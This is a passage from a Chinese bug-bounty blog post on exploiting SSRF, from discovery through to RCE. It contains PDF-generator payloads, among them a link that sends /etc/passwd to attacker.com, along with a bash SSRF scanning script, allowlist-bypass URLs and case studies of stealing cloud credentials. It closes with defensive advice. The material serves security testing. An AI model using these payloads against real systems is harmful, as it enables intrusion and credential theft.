+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 如果服务器挂起，端口是开放的</span><br>http://internal-host:22     <span class="hljs-comment"># SSH — 挂起</span><br>http://internal-host:9999   <span class="hljs-comment"># 关闭 — 快速拒绝</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="PDF-生成器：取之不尽的礼物"><a href="#PDF-生成器：取之不尽的礼物" class="headerlink" title="PDF 生成器：取之不尽的礼物"></a>PDF 生成器：取之不尽的礼物</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-comment">&lt;!-- 在 HTML-to-PDF 转换器中 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://169.254.169.254/latest/meta-data/&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">object</span> <span class="hljs-attr">data</span>=<span class="hljs-string">&quot;http://localhost:6379/&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/html&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">object</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">embed</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;file:///etc/passwd&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;http://attacker.com/extract?data=&lt;?php echo file_get_contents(&#x27;/etc/passwd&#x27;); ?&gt;&quot;</span>&gt;</span><br><br><span class="hljs-comment">&lt;!-- 基于 CSS 的 SSRF --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="language-css"></span><br><span class="language-css">  <span class="hljs-keyword">@import</span> url(<span class="hljs-string">&#x27;http://169.254.169.254/latest/meta-data/&#x27;</span>);</span><br><span class="language-css">  <span class="hljs-selector-tag">body</span> &#123; <span class="hljs-attribute">background</span>: <span class="hljs-built_in">url</span>(<span class="hljs-string">&#x27;http://attacker.com/x.jpg&#x27;</span>); &#125;</span><br><span class="language-css"></span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="我验证过的方法论"><a href="#我验证过的方法论" class="headerlink" title="我验证过的方法论"></a>我验证过的方法论</h3><h3 id="阶段-1：发现"><a href="#阶段-1：发现" class="headerlink" title="阶段 1：发现"></a>阶段 1：发现</h3><ul>
+<li>映射所有 URL 参数：使用 Burp Suite Pro 的 “Discover content” 和 ParamMiner</li>
+<li>测试文件上传替代方案：寻找”从 URL 获取”选项</li>
+<li>检查 webhooks：集成页面、通知设置</li>
+<li>审查 API 文档：Swagger&#x2F;OpenAPI 规范经常会泄露参数</li>
+</ul>
+<h3 id="阶段-2：验证"><a href="#阶段-2：验证" class="headerlink" title="阶段 2：验证"></a>阶段 2：验证</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 使用你自己的 VPS 搭建 callback 服务器</span><br>python -m http.server 8080<br><br><span class="hljs-comment"># 或者使用 Burp Collaborator</span><br><span class="hljs-comment"># 或者使用 interact.sh、canarytokens.org</span><br><br><span class="hljs-comment"># 测试基本 SSRF</span><br>?url=http://YOUR-IP:8080/test<br></code></pre></td></tr></table></figure>
+
+<h3 id="阶段-3：绕过测试"><a href="#阶段-3：绕过测试" class="headerlink" title="阶段 3：绕过测试"></a>阶段 3：绕过测试</h3><ul>
+<li>测试所有 localhost 变体</li>
+<li>尝试协议走私（file:&#x2F;&#x2F;、gopher:&#x2F;&#x2F;、dict:&#x2F;&#x2F;）</li>
+<li>按需设置 DNS 重绑定</li>
+<li>测试编码绕过</li>
+</ul>
+<h3 id="阶段-4：影响升级"><a href="#阶段-4：影响升级" class="headerlink" title="阶段 4：影响升级"></a>阶段 4：影响升级</h3><ul>
+<li>云元数据：AWS&#x2F;Azure&#x2F;GCP</li>
+<li>内部网络扫描：发现服务</li>
+<li>利用已知服务：Redis、Elasticsearch、Docker 等</li>
+<li>与其他漏洞组合利用：XXE、CRLF、open redirects</li>
+</ul>
+<h3 id="真实案例研究"><a href="#真实案例研究" class="headerlink" title="真实案例研究"></a>真实案例研究</h3><h3 id="案例-1：通过-PDF-导出访问-AWS-元数据"><a href="#案例-1：通过-PDF-导出访问-AWS-元数据" class="headerlink" title="案例 1：通过 PDF 导出访问 AWS 元数据"></a>案例 1：通过 PDF 导出访问 AWS 元数据</h3><p>场景：具有服务端 PDF 生成功能的 SaaS 平台<br>漏洞链：</p>
+<ol>
+<li>在 &#x2F;api&#x2F;export&#x2F;pdf 的 template_url 参数中发现 SSRF</li>
+<li>使用 127.0.0.1.nip.io 绕过 localhost 限制</li>
+<li>成功访问 AWS 元数据 API</li>
+<li>从元数据端点提取 IAM 凭证</li>
+<li>展示了枚举 AWS 资源的能力</li>
+<li>以严重级别提交报告，并附完整修复方案<br>核心要点：PDF 生成器通常放宽了安全控制，因为它们的设计目的就是获取远程资源。它们是 SSRF 测试的绝佳目标。</li>
+</ol>
+<h3 id="案例-2：通过-Webhook-SSRF-利用-Redis"><a href="#案例-2：通过-Webhook-SSRF-利用-Redis" class="headerlink" title="案例 2：通过 Webhook SSRF 利用 Redis"></a>案例 2：通过 Webhook SSRF 利用 Redis</h3><p>场景：具有 webhook 集成功能的应用<br>漏洞链：</p>
+<ol>
+<li>在 webhook URL 配置中发现 SSRF</li>
+<li>内部网络端口扫描发现内部网络上的 Redis</li>
+<li>使用 Gopher 协议发送 Redis 命令</li>
+<li>展示了向 Redis 写入任意数据的能力</li>
+<li>通过 cron job 注入展示了 RCE 潜力</li>
+<li>附上网络拓扑文档提交严重级别报告<br>核心要点：Webhook 功能通常被信任且输入校验较少。它们值得深入测试。</li>
+</ol>
+<h3 id="案例-3：图片处理中的-Blind-SSRF"><a href="#案例-3：图片处理中的-Blind-SSRF" class="headerlink" title="案例 3：图片处理中的 Blind SSRF"></a>案例 3：图片处理中的 Blind SSRF</h3><p>场景：具有图片优化功能的电商平台<br>漏洞链：</p>
+<ol>
+<li>在图片获取功能中发现 Blind SSRF</li>
+<li>基于时间的分析揭示了开放的内部端口</li>
+<li>在端口 2375 检测到 Docker API</li>
+<li>构造用于容器创建的 Gopher payload</li>
+<li>展示了挂载宿主机文件系统的能力</li>
+<li>通过细致的测试证明了 RCE 能力<br>核心要点：Blind SSRF 需要创造力，但同样可以达到严重级别。基于时间的检测和带外回调是不可或缺的技术。</li>
+</ol>
+<h3 id="自动化工具"><a href="#自动化工具" class="headerlink" title="自动化工具"></a>自动化工具</h3><h3 id="自定义-SSRF"><a href="#自定义-SSRF" class="headerlink" title="自定义 SSRF"></a>自定义 SSRF</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><span class="hljs-comment"># ssrf-hunter.sh</span><br><br>TARGET=<span class="hljs-variable">$1</span><br>CALLBACK=<span class="hljs-variable">$2</span><br><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;[*] Testing SSRF on <span class="hljs-variable">$TARGET</span>&quot;</span><br><br><span class="hljs-comment"># 1. 基本回调</span><br>curl <span class="hljs-string">&quot;<span class="hljs-variable">$TARGET</span>?url=http://<span class="hljs-variable">$CALLBACK</span>/basic&quot;</span><br><br><span class="hljs-comment"># 2. 云元数据</span><br><span class="hljs-keyword">for</span> ip <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;169.254.169.254&quot;</span> <span class="hljs-string">&quot;metadata.google.internal&quot;</span> <span class="hljs-string">&quot;169.254.169.254.nip.io&quot;</span>; <span class="hljs-keyword">do</span><br>    curl <span class="hljs-string">&quot;<span class="hljs-variable">$TARGET</span>?url=http://<span class="hljs-variable">$ip</span>/latest/meta-data/&quot;</span> -o output.txt<br>    <span class="hljs-keyword">if</span> grep -q <span class="hljs-string">&quot;ami-id\\|instance-id&quot;</span> output.txt; <span class="hljs-keyword">then</span><br>        <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;[!] AWS Metadata accessible!&quot;</span><br>    <span class="hljs-keyword">fi</span><br><span class="hljs-keyword">done</span><br><br><span class="hljs-comment"># 3. 协议测试</span><br><span class="hljs-keyword">for</span> proto <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;file://&quot;</span> <span class="hljs-string">&quot;gopher://&quot;</span> <span class="hljs-string">&quot;dict://&quot;</span> <span class="hljs-string">&quot;ftp://&quot;</span>; <span class="hljs-keyword">do</span><br>    curl <span class="hljs-string">&quot;<span class="hljs-variable">$TARGET</span>?url=<span class="hljs-variable">$&#123;proto&#125;</span>localhost/test&quot;</span><br><span class="hljs-keyword">done</span><br><br><span class="hljs-comment"># 4. 扫描常见服务端口</span><br><span class="hljs-keyword">for</span> port <span class="hljs-keyword">in</span> 22 80 443 6379 9200 2375 3306 5432 11211 27017; <span class="hljs-keyword">do</span><br>    curl <span class="hljs-string">&quot;<span class="hljs-variable">$TARGET</span>?url=http://localhost:<span class="hljs-variable">$port</span>&quot;</span> -o /dev/null -s -w <span class="hljs-string">&quot;%&#123;time_total&#125;\\n&quot;</span><br><span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="日常使用的工具"><a href="#日常使用的工具" class="headerlink" title="日常使用的工具"></a>日常使用的工具</h3><ul>
+<li>Burp Suite Pro + 扩展：Collaborator Everywhere、ParamMiner</li>
+<li>SSRFMap：<a target="_blank" rel="noopener" href="https://github.com/swisskyrepo/SSRFmap">https://github.com/swisskyrepo/SSRFmap</a></li>
+<li>Gopherus：Gopher payload 生成器</li>
+<li>interactsh：比 Burp Collaborator 更好用</li>
+<li>nuclei：SSRF 模板</li>
+<li>自定义 Python 自动化脚本</li>
+</ul>
+<h3 id="防御规避：红队视角"><a href="#防御规避：红队视角" class="headerlink" title="防御规避：红队视角"></a>防御规避：红队视角</h3><h3 id="当应用使用白名单时"><a href="#当应用使用白名单时" class="headerlink" title="当应用使用白名单时"></a>当应用使用白名单时</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 尝试在白名单域名上寻找 open redirect</span><br>http://trusted.com/redirect?url=http://169.254.169.254<br><br><span class="hljs-comment"># CRLF 注入破坏解析器</span><br>http://trusted.com%0D%0AHost:%20169.254.169.254%0D%0A%0D%0AGET%20/latest/meta-data<br><br><span class="hljs-comment"># DNS 技巧</span><br>your-domain.trusted.com  <span class="hljs-comment"># 如果你控制 trusted.com 的子域名</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="当它们解析-URL-组件时"><a href="#当它们解析-URL-组件时" class="headerlink" title="当它们解析 URL 组件时"></a>当它们解析 URL 组件时</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 解析器混淆</span><br>http://trusted.com@169.254.169.254<br>http://trusted.com#@169.254.169.254<br>http://trusted.com%23@169.254.169.254<br>http://trusted.com%2523@169.254.169.254    <span class="hljs-comment"># 双重编码</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="撰写报告：最大化影响"><a href="#撰写报告：最大化影响" class="headerlink" title="撰写报告：最大化影响"></a>撰写报告：最大化影响</h3><h3 id="什么才是一份优秀的严重级别-SSRF-报告"><a href="#什么才是一份优秀的严重级别-SSRF-报告" class="headerlink" title="什么才是一份优秀的严重级别 SSRF 报告"></a>什么才是一份优秀的严重级别 SSRF 报告</h3><p>糟糕的报告：</p>
+<blockquote>
+<p>标题：SSRF in &#x2F;api&#x2F;fetch<br>步骤：发送 GET 请求到 &#x2F;api&#x2F;fetch?url&#x3D;<a target="_blank" rel="noopener" href="http://169.254.169.254/">http://169.254.169.254</a><br>影响：可以访问元数据</p>
+</blockquote>
+<p>严重级别的报告：</p>
+<blockquote>
+<p>标题：SSRF 导致通过 IAM 凭证提取完全接管 AWS 账户</p>
+</blockquote>
+<blockquote>
+<p>摘要：<br>PDF 导出功能中的 SSRF 漏洞允许攻击者访问 AWS 实例元数据、提取 IAM 凭证，并接管整个 AWS 基础设施。</p>
+</blockquote>
+<blockquote>
+<p>复现步骤：</p>
+<ol>
+<li>导航到 &#x2F;dashboard&#x2F;export</li>
+<li>拦截 PDF 生成请求</li>
+<li>将 template_url 修改为：<a target="_blank" rel="noopener" href="http://127.0.0.1.nip.io/169.254.169.254/latest/meta-data/iam/security-credentials/prod-role">http://127.0.0.1.nip.io/169.254.169.254/latest/meta-data/iam/security-credentials/prod-role</a></li>
+<li>在响应中观察到 IAM 凭证</li>
+</ol>
+</blockquote>
+<blockquote>
+<p>影响展示：</p>
+<ul>
+<li>提取的 AccessKeyId：AKIA…</li>
+<li>提取的 SecretAccessKey：（报告中已脱敏）</li>
+<li>使用 AWS CLI 测试：aws s3 ls –profile stolen</li>
+<li>发现 50+ 个包含客户数据的 S3 bucket</li>
+<li>展示了对生产数据库备份的读取权限</li>
+</ul>
+</blockquote>
+<blockquote>
+<p>推荐修复方案：</p>
+<ol>
+<li>实施严格的 URL 白名单</li>
+<li>使用 AWS IMDSv2 并要求 token</li>
+<li>禁用不必要的内部网络访问</li>
+<li>添加出站流量过滤</li>
+</ol>
+</blockquote>
+<blockquote>
+<p>附件：</p>
+<ul>
+<li>视频 POC</li>
+<li>网络拓扑图</li>
+<li>可访问资源列表（已脱敏）</li>
+</ul>
+</blockquote>
+<p>既然你在读这篇文章，你可能也在做防御：</p>
+<ul>
+<li>✅ 实施严格的 URL 白名单（而非黑名单）</li>
+<li>✅ 禁用未使用的协议（file:&#x2F;&#x2F;、gopher:&#x2F;&#x2F;、dict:&#x2F;&#x2F;）</li>
+<li>✅ 使用独立的网络段（VPC 隔离）</li>
+<li>✅ 实施出站流量过滤</li>
+<li>✅ 使用 AWS IMDSv2 并要求 token</li>
+<li>✅ 分别验证 URL 各组件</li>
+<li>✅ 使用专为 SSRF 防护设计的库</li>
+<li>✅ 实施超时和大小限制</li>
+<li>✅ 记录并监控所有出站请求</li>
+<li>✅ 定期进行安全审计</li>
+</ul>
+<h3 id="架构中的-SSRF"><a href="#架构中的-SSRF" class="headerlink" title="架构中的 SSRF"></a>架构中的 SSRF</h3><p>Serverless &#x2F; Lambda 函数：</p>
+<ul>
+<li>仍然可以访问元数据 API</li>
+<li>内部网络访问较少</li>
+<li>关注云提供商 API</li>
+</ul>
+<p>Kubernetes 环境：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># Service account tokens</span><br>http://localhost:10250/pods<br>http://localhost:8001/api/v1/namespaces/default/pods<br><br><span class="hljs-comment"># etcd（如果暴露了）</span><br>http://localhost:2379/v2/keys/<br></code></pre></td></tr></table></figure>
+
+<p>GraphQL SSRF：</p>
+<figure class="highlight graphql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs graphql"><span class="hljs-keyword">mutation</span> <span class="hljs-punctuation">&#123;</span><br>  importData<span class="hljs-punctuation">(</span><span class="hljs-symbol">url</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;http://169.254.169.254/latest/meta-data/&quot;</span><span class="hljs-punctuation">)</span> <span class="hljs-punctuation">&#123;</span><br>    status<br>  <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="发现-SSRF-方法总结"><a href="#发现-SSRF-方法总结" class="headerlink" title="发现 SSRF 方法总结"></a>发现 SSRF 方法总结</h3><ul>
+<li>PDF 生成器是高价值目标——它们执行 JavaScript、加载外部资源，且通常缺乏 SSRF 防护</li>
+<li>Webhooks 值得更多关注——很多猎人只测试 XSS，却忽视了 SSRF 的潜力</li>
+<li>基于时间的检测非常强大——当无法看到响应时，时间差异可以揭示开放的端口和服务</li>
+<li>影响来自于链条组合——单独的 SSRF 可能只是中等严重级别，但 SSRF → RCE 就变成了严重级别</li>
+<li>云元数据无处不在——AWS、Azure、GCP 都暴露了类似的元数据端点，这些都是高价值目标</li>
+<li>文档会泄露秘密——API 文档经常会暴露值得测试的隐藏参数</li>
+<li>平衡自动化和手动测试——工具发现常见问题，但手动的创造力才能发现严重级别的漏洞</li>
+<li>上下文决定严重级别——同样的技术缺陷，在不同环境下可能产生截然不同的影响</li>
+</ul>
+<h3 id="反思"><a href="#反思" class="headerlink" title="反思"></a>反思</h3><p>SSRF 漏洞代表着一种严重的安全隐患，可能暴露一个组织的整个基础设施。一个看似简单的服务端请求，可以成为通往云凭证、内部服务甚至远程代码执行的路径。</p>
+<p>本文中的技术基于多年的研究、对已公开漏洞的学习，以及在授权环境中的实际测试。从发现基本 SSRF 到实现严重级别影响之间的差距，在于理解目标的架构并创造性地串联你的访问路径。</p>
+<p>请记住：始终在经过授权的目标上进行道德测试。未经许可绝不访问任何系统。遵循负责任的披露规范。</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/SSRF%E6%BC%8F%E6%B4%9E/" class="print-no-link">#SSRF漏洞</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>SSRF — 从探测到 RCE</div>
+      <div>https://xiaobite-hacker.github.io/2026/04/23/SSRF-从探测到RCE/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>xiaobite</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2026年4月23日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2026/04/29/Wayback%20Machine%20%E5%9C%A8%E6%BC%8F%E6%B4%9E%E8%B5%8F%E9%87%91%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/" title="Wayback Machine 在漏洞赏金中的应用">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Wayback Machine 在漏洞赏金中的应用</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2026/04/13/CVE-2026-5173%EF%BC%9AGitLab-WebSocket-%E6%9C%AA%E6%8E%88%E6%9D%83%E6%96%B9%E6%B3%95%E6%89%A7%E8%A1%8C-PoC/" title="CVE-2026-5173：GitLab WebSocket 未授权方法执行 PoC">
+                        <span class="hidden-mobile">CVE-2026-5173：GitLab WebSocket 未授权方法执行 PoC</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
